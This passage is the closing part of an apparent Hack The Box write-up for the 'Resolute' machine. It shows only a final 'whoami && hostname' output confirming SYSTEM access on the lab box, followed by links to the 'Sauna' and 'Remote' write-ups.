whoami <span style="color:#f92672">&amp;&amp;</span> hostname
nt authority<span style="color:#ae81ff">\s</span>ystem
Resolute

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;

</code></pre></div>
  </div>
  

<div class="navigation navigation-single">
    
    <a href="/hack-the-box/sauna/" class="navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Sauna - Easy</span>
    </a>
    
    
    <a href="/hack-the-box/remote/" class="navigation-next">
      <span class="navigation-tittle">Remote - Easy</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    

<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>


    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
        
    <script type="text/javascript">
        
        hljs.initHighlightingOnLoad();
    </script>
    



    



    </body>
</html>
